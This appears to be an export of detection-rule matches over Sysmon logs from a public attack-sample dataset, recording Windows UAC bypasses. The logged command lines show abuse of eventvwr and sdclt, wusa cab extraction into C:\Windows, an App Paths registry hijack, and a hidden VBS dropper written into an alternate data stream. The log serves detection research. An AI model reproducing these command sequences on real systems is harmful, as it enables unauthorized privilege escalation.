Hashes: SHA1=ADA934DA7A0D40FA0F54652687F762B82EA5F27E,MD5=91415D7EB992B77410145DD5FE453D25,SHA256=2F515E9662CA785A9C877E81BE1D52879EF4741BBDE3213550A3C077127436C2,IMPHASH=7CAE841724AAC4485D1A064D5F0E471F
ParentProcessGuid: 365ABB72-88DC-5CD3-0000-00100DA51A00
ProcessId: 3752
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-8980-5CD3-0000-0010972D1F00
CommandLine: '""C:\Windows\system32\eventvwr.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13982'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 01:59:28.669
"
2019-05-09T01:59:28.950272+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx,1,Microsoft-Windows-Sysmon,1,11115,IEWIN7,"Image: C:\Windows\System32\eventvwr.exe
RuleName: ''
Description: Event Viewer Snapin Launcher
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2704
LogonGuid: 365ABB72-863B-5CD3-0000-00204A390100
Hashes: SHA1=ADA934DA7A0D40FA0F54652687F762B82EA5F27E,MD5=91415D7EB992B77410145DD5FE453D25,SHA256=2F515E9662CA785A9C877E81BE1D52879EF4741BBDE3213550A3C077127436C2,IMPHASH=7CAE841724AAC4485D1A064D5F0E471F
ParentProcessGuid: 365ABB72-88DC-5CD3-0000-00100DA51A00
ProcessId: 3884
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-8980-5CD3-0000-00105F451F00
CommandLine: '""C:\Windows\system32\eventvwr.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1394a'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 01:59:28.856
"
2019-05-09T01:59:29.090897+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;Potentially Suspicious Event Viewer Child Process;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx,1,Microsoft-Windows-Sysmon,1,11116,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\eventvwr.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3884
LogonGuid: 365ABB72-863B-5CD3-0000-00204A390100
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-8980-5CD3-0000-00105F451F00
ProcessId: 3840
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-8980-5CD3-0000-0010134D1F00
CommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1394a'
IntegrityLevel: High
ParentImage: C:\Windows\System32\eventvwr.exe
UtcTime: 2019-05-09 01:59:28.903
"
2019-05-09T02:00:01.794022+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx,1,Microsoft-Windows-Sysmon,1,11117,IEWIN7,"Image: C:\Windows\System32\wsqmcons.exe
RuleName: ''
Description: Windows SQM Consolidator
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 452
LogonGuid: 365ABB72-8638-5CD3-0000-0020E7030000
Hashes: SHA1=BEFFCC112AEE709B8083056973759EAB54F4985F,MD5=22DE9DFF5565B00F230EAC0C635DAEB7,SHA256=45F48A7B9E6BA40D5E943B05912E000F6264B5707C0E70AE8140C84F745B7D1C,IMPHASH=6199B3F7B851154BC163FE8A178B52CD
ParentProcessGuid: 365ABB72-8638-5CD3-0000-0010C0590000
ProcessId: 272
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-89A1-5CD3-0000-001013732100
CommandLine: 'C:\Windows\System32\wsqmcons.exe '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-05-09 02:00:01.794
"
2019-05-09T02:07:51.131697+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UACBypass_SDCLTBypass.evtx,1,Microsoft-Windows-Sysmon,1,11123,IEWIN7,"Image: C:\Windows\System32\sdclt.exe
RuleName: ''
Description: Microsoft® Windows Backup
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2704
LogonGuid: 365ABB72-863B-5CD3-0000-002082390100
Hashes: SHA1=8D4E7579031F773DFC73D54C72E865CCCDAC77F0,MD5=5EFDBEAECD69E250E5BA4A2950203CD4,SHA256=F66CEDB142FB711B9A9E57EFF498DF0BBCA16419EE089AB35529FAE4E6A19E7E,IMPHASH=B4141E03977FAAF21E42D3AE32C0DAC8
ParentProcessGuid: 365ABB72-88DC-5CD3-0000-00100DA51A00
ProcessId: 3836
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-8B77-5CD3-0000-0010E8FD2900
CommandLine: '""C:\Windows\system32\sdclt.exe"" /kickoffelev '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13982'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:07:51.116
"
2019-05-09T02:08:00.446150+00:00,Hacktool - EDR-Freeze Execution;Sdclt Child Processes;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UACBypass_SDCLTBypass.evtx,1,Microsoft-Windows-Sysmon,1,11126,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '?'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3836
LogonGuid: 365ABB72-863B-5CD3-0000-00204A390100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-8B77-5CD3-0000-0010E8FD2900
ProcessId: 2264
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-8B80-5CD3-0000-001065512A00
CommandLine: '""C:\Windows\System32\cmd.exe"" /c notepad.exe'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1394a'
IntegrityLevel: High
ParentImage: C:\Windows\System32\sdclt.exe
UtcTime: 2019-05-09 02:08:00.336
"
2019-05-09T02:52:18.765888+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,11,11219,IEWIN7,"ProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
CreationUtcTime: 2019-05-09 02:52:18.765
UtcTime: 2019-05-09 02:52:18.765
ProcessId: 1900
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
"
2019-05-09T02:52:18.844013+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11220,IEWIN7,"Image: C:\Windows\System32\makecab.exe
RuleName: ''
Description: Microsoft® Cabinet Maker
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 1292
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E2-5CD3-0000-001097410F00
CommandLine: '""C:\Windows\System32\makecab.exe"" C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:18.812
"
2019-05-09T02:52:18.922138+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11222,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3636
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E2-5CD3-0000-0010C6440F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:18.859
"
2019-05-09T02:52:18.953388+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11224,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3620
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E2-5CD3-0000-001083470F00
CommandLine: '""C:\Windows\system32\wusa.exe"" ""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:18.906
"
2019-05-09T02:52:18.969013+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11226,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 2420
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E2-5CD3-0000-001074490F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:18.922
"
2019-05-09T02:52:19.250263+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11228,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020A43A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3536
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-95E3-5CD3-0000-00100C650F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13aa4'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:19.172
"
2019-05-09T02:52:21.250263+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11229,IEWIN7,"Image: C:\Windows\System32\makecab.exe
RuleName: ''
Description: Microsoft® Cabinet Maker
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3828
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E5-5CD3-0000-00101F720F00
CommandLine: '""C:\Windows\System32\makecab.exe"" C:\Windows\System32\wscript.exe C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:21.234
"
2019-05-09T02:52:21.265888+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11231,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3824
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E5-5CD3-0000-00108F720F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:21.234
"
2019-05-09T02:52:21.281513+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11233,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 2852
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E5-5CD3-0000-001065730F00
CommandLine: '""C:\Windows\system32\wusa.exe"" ""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:21.234
"
2019-05-09T02:52:21.297138+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11235,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 2364
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E5-5CD3-0000-001033750F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:21.234
"
2019-05-09T02:52:21.594013+00:00,Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11237,IEWIN7,"Image: C:\Windows\System32\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020A43A0100
Hashes: SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 2800
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-95E5-5CD3-0000-0010E1890F00
CommandLine: '""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13aa4'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:21.422
"
2019-05-09T02:52:23.500263+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Non-privileged Usage of Reg or Powershell;Potentially Suspicious CMD Shell Output Redirect;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11238,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 2812
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E7-5CD3-0000-001046950F00
CommandLine: '""C:\Windows\system32\cmd.exe""  /C ""echo Dim objShell:Dim oFso:Set oFso = CreateObject(""Scripting.FileSystemObject""):Set objShell = WScript.CreateObject(""WScript.Shell""):command = ""powershell.exe"":objShell.Run command, 0:command = ""C:\Windows\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del C:\Windows\wscript.exe&&del C:\Windows\wscript.exe.manifest"""""""""":objShell.Run command, 0:Set objShell = Nothing > ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:23.484
"
2019-05-09T02:52:23.500263+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,11,11241,IEWIN7,"ProcessGuid: 365ABB72-95E7-5CD3-0000-001046950F00
CreationUtcTime: 2018-01-03 01:21:25.726
UtcTime: 2019-05-09 02:52:23.500
ProcessId: 2812
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData:tghjx5xz2ky.vbs
Image: C:\Windows\system32\cmd.exe
"
2019-05-09T02:52:23.531513+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_11_1_15_WScriptBypassUAC.evtx,1,Microsoft-Windows-Sysmon,1,11242,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3784
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
ProcessGuid: 365ABB72-95E7-5CD3-0000-001004970F00
CommandLine: '""C:\Windows\system32\cmd.exe""  /C ""C:\Windows\wscript.exe ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 02:52:23.515
"
2019-05-09T03:25:24.630445+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_13_UACBypass_AppPath_Control.evtx,1,Microsoft-Windows-Sysmon,13,11264,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 1900
ProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
UtcTime: 2019-05-09 03:25:24.552
Details: C:\windows\system32\cmd.exe
"
2019-05-09T03:25:24.896070+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_13_UACBypass_AppPath_Control.evtx,1,Microsoft-Windows-Sysmon,1,11265,IEWIN7,"Image: C:\Windows\System32\sdclt.exe
RuleName: ''
Description: Microsoft® Windows Backup
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1900
LogonGuid: 365ABB72-94CD-5CD3-0000-0020DD3A0100
Hashes: SHA1=8D4E7579031F773DFC73D54C72E865CCCDAC77F0,MD5=5EFDBEAECD69E250E5BA4A2950203CD4,SHA256=F66CEDB142FB711B9A9E57EFF498DF0BBCA16419EE089AB35529FAE4E6A19E7E,IMPHASH=B4141E03977FAAF21E42D3AE32C0DAC8
ParentProcessGuid: 365ABB72-9570-5CD3-0000-00103FC90A00
ProcessId: 3184
CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\onedrive\
